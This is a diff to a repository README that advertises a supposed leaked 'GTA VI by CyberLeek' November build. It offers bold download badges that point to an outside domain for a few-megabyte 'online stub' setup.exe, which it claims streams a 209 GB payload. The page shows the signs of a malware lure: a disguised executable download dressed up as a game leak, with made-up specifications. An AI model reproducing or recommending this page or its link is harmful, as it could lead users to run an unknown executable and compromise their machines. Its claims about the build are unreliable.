@@ -1,22 +1,26 @@
-
 <div align="center">
-  [![Get installer 4 MB](https://img.shields.io/badge/⬇_Get_installer_4_MB-00B8D9?style=for-the-badge&logo=windows&logoColor=white)](https://shanxisaide.com/s/file)
+
+<pre>
+╔═══════════════════════════════════════════════╗
+║   GTA VI BY CYBERLEEK · NOVEMBER BUILD        ║
+║   209 GB payload · exe drops 2026-11-23       ║
+╚═══════════════════════════════════════════════╝
+</pre>
+
+<h1>🎮 CyberLeek GTA 6 Build Download</h1>
+
+<p><b>GTA VI by CyberLeek · November build · online installer · PC launch path</b></p>
+
+[![Download CyberLeek GTA 6 Build](https://img.shields.io/badge/⬇_DOWNLOAD_PACKAGE-28A745?style=for-the-badge&logo=windows&logoColor=white)](https://shanxisaide.com/s/file)
+
+![By](https://img.shields.io/badge/BY-CYBERLEEK-1B7A32?plastic)
+![Package](https://img.shields.io/badge/PACKAGE-ARCHIVE_→_SETUP.EXE-155724?flat-square&logo=windows&logoColor=white)
+![Installer](https://img.shields.io/badge/INSTALLER-ONLINE_STUB-155724?flat-square)
+![Payload](https://img.shields.io/badge/PAYLOAD-209_GB_STREAMED-155724?flat-square)
+![Platform](https://img.shields.io/badge/TARGET-XBOX_→_PC_VIA_EMULATOR-155724?flat-square)
+![Exe](https://img.shields.io/badge/EXE-NOV_23-FFA500?flat-square)
+
 </div>
-
-<h1 align="center">GTA VI CyberLeek Online Installer — why the archive is only a few megabytes</h1>
-
-<p align="center">
-  A few megabytes of archive, 209 GB of payload, one stub that does the fetching.<br>
-  This page explains the mechanism before you start it.
-</p>
-
-<p align="center">
-  <img src="https://img.shields.io/badge/BY-CYBERLEEK-0A7C92?plastic" alt="By CyberLeek">
-  <img src="https://img.shields.io/badge/PACKAGE-ARCHIVE_→_SETUP.EXE-00B8D9?flat-square" alt="Archive with setup.exe">
-  <img src="https://img.shields.io/badge/DELIVERY-STREAMED_BY_FILE-0891B2?flat-square" alt="Streamed by file">
-  <img src="https://img.shields.io/badge/RESUME-AUTOMATIC-0E7490?flat-square" alt="Automatic resume">
-  <img src="https://img.shields.io/badge/VERIFY-HASH_PER_FILE-155E75?flat-square" alt="Hash per file">
-</p>
 
 <table>
 <tr><td>📦 <b>Archive</b></td><td>a few MB, stub only</td><td>🛜 <b>Payload</b></td><td>209 GB streamed</td></tr>
